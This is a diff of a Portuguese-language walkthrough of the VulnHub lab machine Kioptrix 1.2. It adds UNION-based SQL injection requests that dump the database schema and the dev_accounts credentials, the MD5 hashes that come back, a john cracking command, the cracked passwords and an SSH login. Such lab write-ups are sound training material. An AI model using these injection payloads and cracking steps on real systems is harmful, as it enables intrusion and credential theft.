@@ -116,6 +116,8 @@ database = SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA
 GET /gallery/gallery.php?id=-1+union+select+1,SCHEMA_NAME,3,4,5,6+FROM+INFORMATION_SCHEMA.SCHEMATA HTTP/1.1
 ```
 
+Encontramos 3 databases, a gallery, a mysql e a information schema
+
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql2.png)
 
 Vamos extrair agora as Tables, para isso vamos usar a query Group Concat pois ela possibilita termos mais de um resultado na mesma linha, facilitando assim a extração de informações
@@ -128,17 +130,19 @@ GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(SCHEMA_NAME),3,4,5,6+
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql3.png)
 
-```
-GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(TABLE_NAME),3,4,5,6+FROM+INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA+=+"GALLERY" HTTP/1.1
-```
+Aqui podemos ver que apacereu na mesma linhas as três databases
 
-E aqui vemos que temos várias Tables
+E aqui vemos que temos várias Tables dentro da Database Gallery, que é a que vamos enumerar
+
+```
+GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(TABLE_NAME),3,4,5,6+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+=+"GALLERY" HTTP/1.1
+```
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql4.png)
 
-Vamos extrair primeiro informações da users
+dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users
 
-search=Tom’ UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = “Staff”– -
+Vamos extrair primeiro informações da Gallery
 
 ```
 GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(COLUMN_NAME),3,4,5,6+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+=+"GALLERY" HTTP/1.1
@@ -146,7 +150,7 @@ GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(COLUMN_NAME),3,4,5,6+
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql5.png)
 
-Agora verificamos todas as tables
+Agora verificamos todas as tables e colunas
 
 ```
 GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(TABLE_NAME,":",COLUMN_NAME),3,4,5,6+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+=+"GALLERY" HTTP/1.1
@@ -156,3 +160,45 @@ GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(TABLE_NAME,":",COLUMN
 
 O que essa query vai me trazer? Traduzindo… me traga o nome das colunas (COLUMN_NAME) dentro da information schema de todas as colunas (INFORMATION_SCHEMA.COLUMNS) onde eu quero somente da database GALLERY (TABLE_SCHEMA) e o nome da tabela dentro dessa database é a (TABLE_NAME). Ficou melhor assim?
 
+Certo, agora vamos extrair aquelas informações da database gallery com as tables dev_accounts e as colunas username e password
+
+```
+GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(username,":",password),3,4,5,6+FROM+dev_accounts
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql7.png)
+
+```
+dreg:0d3eccfb887aabd50f243b3f155c0f85,loneferret:5badcaf789d3d1d09794d8f021f40f0e
+```
+
+Dois hashes, vamos quebrar eles
+
+```bash
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql8.png)
+
+```
+loneferret:starwars
+dreg:Mast3r
+```
+
+Paralelo a isso o nosso hydra que deixamos lá em cima rodando conseguiu achar a senha também!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/hydra1.png)
+
+# Acesso SSH
+
+Agora acessamos os dois usuários via SSH
+
+Dreg
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/dreg.png)
+
+Loneferret
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/lone.png)
+
+Agora vamos iniciar a escalação de privilégios para root
